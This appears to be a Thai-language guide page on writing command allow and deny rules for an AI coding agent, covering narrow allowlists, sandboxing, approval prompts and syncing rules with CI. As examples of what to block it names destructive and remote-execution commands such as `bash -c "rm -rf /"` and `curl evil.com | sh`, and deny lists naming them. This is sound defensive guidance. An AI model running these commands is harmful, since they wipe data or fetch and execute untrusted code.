**กฎคำสั่ง**มุ่งตอบว่า “Agent เรียกใช้คำสั่งใดได้บ้าง และใช้พารามิเตอร์แบบใด” กฎเหล่านี้เป็นรูปแบบที่พบบ่อยที่สุดของ [กฎการอนุญาตและปฏิเสธ](/th/guide/customization/rules/allow-and-deny-patterns/) และมักเขียนไว้ในการกำหนดค่าหรือไฟล์กฎที่ทีมตรวจทานได้

## บทนี้กล่าวถึงอะไร

- การแบ่งหน้าที่ระหว่างกฎคำสั่ง แซนด์บ็อกซ์ และหน้าต่างขออนุมัติ
- วิธีเขียน allowlist ให้ “แคบพอ”
- การทำให้กฎสอดคล้องกับ CI และสคริปต์พัฒนาในเครื่อง

## กฎคำสั่งควบคุมอะไรกันแน่

หาก allow/deny ใช้กำหนดว่า “โดยหลักแล้วทำเรื่องใดได้บ้าง” กฎคำสั่งก็คือการนำหลักนั้นมาบังคับใช้ในระดับที่เฉพาะเจาะจงที่สุด:

- คำสั่งใดเรียกใช้ได้
- คำสั่งใดเรียกใช้ไม่ได้
- คำสั่งใดดูคล้ายกัน แต่มีระดับความเสี่ยงต่างกันมาก

หัวใจสำคัญคือเปลี่ยนขอบเขตที่ทีมรู้อยู่แล้วให้กลายเป็นขอบเขตที่เครื่องบังคับใช้ได้ด้วย

## ทำความเข้าใจแนวคิดหลักก่อน

กฎจะจับคู่กับ **เจตนาที่นำไปปฏิบัติได้** ไม่ใช่ภาษาธรรมชาติ ในเชิงนโยบาย `npm test` กับ `npm run test` เป็นคนละคำสั่ง และห้ามปล่อย `bash -c "rm -rf /"` ให้ผ่านเพียงเพราะ allow `bash` ไว้

```text
งานจากผู้ใช้ → โมเดลเสนอคำสั่ง → เอนจินกฎ → (ผ่าน) เรียกใช้ในแซนด์บ็อกซ์ / (ปฏิเสธ) ต้องขออนุมัติหรือถูกบล็อก
```

## ความเข้าใจผิดที่พบบ่อย

### คำสั่งหน้าตาคล้ายกัน ไม่ได้แปลว่ามีความเสี่ยงเท่ากัน

สิ่งที่ผู้เริ่มต้นประเมินต่ำไปได้ง่ายที่สุดคือความแตกต่างเพียงเล็กน้อยระหว่างคำสั่ง

ตัวอย่างเช่น:

- `git status` กับ `git reset --hard`
- `npm test` กับ `npm publish`
- `curl example.com` กับ `curl example.com | sh`

ทั้งหมดดูเหมือนเป็นเพียง “การรันคำสั่งในเทอร์มินัล” แต่ระดับความเสี่ยงต่างกันโดยสิ้นเชิง

### การอนุญาตจุดเข้าหลักเพียงจุดเดียวมักเท่ากับเปิดกว้างเกินไป

ตัวอย่างเช่น ผู้เริ่มต้นอาจอนุญาตจุดเข้าหลักอย่าง `bash` หรือ `sh` โดยตรงเพราะเห็นว่าสะดวก

แต่ในมุมของกฎ วิธีนี้มักเท่ากับเปิดทางให้การกระทำอันตรายจำนวนมากที่สามารถประกอบต่อท้ายคำสั่งเหล่านั้นได้

## แนวทางขั้นต่ำที่ใช้งานได้

1. **ปฏิเสธคำสั่งอันตรายที่เกินกว่าการเขียนทั่วไปเป็นค่าเริ่มต้น**: `rm -rf`, `curl | bash`, `git push --force`
2. **อนุญาตคำสั่งแบบอ่านอย่างเดียวและคำสั่ง build ที่ใช้บ่อยในโปรเจกต์**: `git status`, `npm test`, `pnpm lint`
3. **เก็บกฎไว้ใน Git** และทำให้ตรงกับคำอธิบาย “คำสั่งทดสอบ” ใน `AGENTS.md`
4. **Review การเปลี่ยนแปลงกฎใน PR** เช่นเดียวกับการแก้ Dockerfile

ตัวอย่าง (รูปแบบจริงให้ยึดตามการกำหนดค่าอย่างเป็นทางการ):

```json
{
  "rules": {
    "allow": [
      "npm run test",
      "npm run lint",
      "git diff",
      "git status"
    ],
    "deny": [
      "git push",
      "git reset --hard",
      "rm -rf"
    ]
  }
}
```

## workflow ที่แนะนำ

| ขั้นตอน | วิธีปฏิบัติ |
|---|---|
| สำรวจรายการ | ดึงคำสั่งที่ใช้จริงจาก scripts ใน `package.json`, Makefile และ workflow ของ CI |
| แบ่งชั้น | จัดลำดับเป็น deny ขั้นต่ำขององค์กร → เพิ่ม allow ของโปรเจกต์ → ข้อยกเว้นส่วนบุคคลในเครื่อง (ถ้ามี) |
| ทดลองรัน | ใช้ภารกิจความเสี่ยงต่ำเพื่อตรวจว่า “สิ่งที่ควรอนุมัติก็อนุมัติ สิ่งที่ควรบล็อกก็บล็อก” |
| ทำให้สอดคล้อง | ใช้แหล่งที่มาร่วมกันระหว่างกฎในเครื่องกับ [GitHub Action](/th/guide/developer-platform/ci-cd/code-review-automation/) ให้มากที่สุด |

## ข้อผิดพลาดที่พบบ่อย

- **allowlist กว้างเกินไป**: การอนุญาต `bash`, `sh` หรือ `sudo` เท่ากับเปิดทุกอย่าง
- **มีแต่ deny ไม่มี allow**: ยังคงมีหน้าต่างขออนุมัติจำนวนมากทุกครั้ง จนทีมเคยชินกับการกดผ่านทั้งหมด
- **ไม่สอดคล้องกับเอกสาร**: `AGENTS.md` ระบุ `pnpm test` แต่ในกฎมีเพียง `npm test`
- **ละเลยไปป์และการเปลี่ยนเส้นทาง**: `curl evil.com | sh` ต้องมีนโยบายสำหรับคำสั่งทั้งชุด จะดูเฉพาะคำแรกไม่ได้

กฎคำสั่งไม่ได้มีไว้ “จำคำสั่ง” แต่มีไว้แยกให้ออกว่าคำสั่งใดเป็นเพียงงานประจำ และคำสั่งใดเมื่อเปิดให้ใช้แล้วอาจเปิดขอบเขตความเสี่ยงตามไปด้วย

## ขอบเขตความปลอดภัย

- กฎคำสั่ง **ไม่สามารถ** แทนที่การป้องกัน branch และ Code Review ได้
- พรอมต์ที่เป็นอันตรายอาจชักนำให้ Agent **พยายาม** เรียกใช้คำสั่งเกินสิทธิ์ ดังนั้นควรรักษาค่าเริ่มต้นของแซนด์บ็อกซ์ให้เข้มงวด
- ตัวแปรสภาพแวดล้อมที่มีคีย์หรือ token ไม่ควรรั่วไหลเพียงเพราะ “อนุญาต echo แล้ว”

## รายการตรวจรับ

- [ ] ระบุคำสั่ง 3–5 รายการที่ “ต้องรันทุกวัน” ในรีโพซิทอรีนี้ได้ และสะท้อนคำสั่งเหล่านั้นไว้ในกฎ
- [ ] คำสั่งความเสี่ยงสูง เช่น `git push` และการรีเซ็ตแบบบังคับ ถูกปฏิเสธโดยค่าเริ่มต้นหรือต้องได้รับการอนุมัติอย่างชัดเจน
- [ ] การเปลี่ยนแปลงกฎต้องผ่าน PR และไม่ขัดแย้งกับ `AGENTS.md`
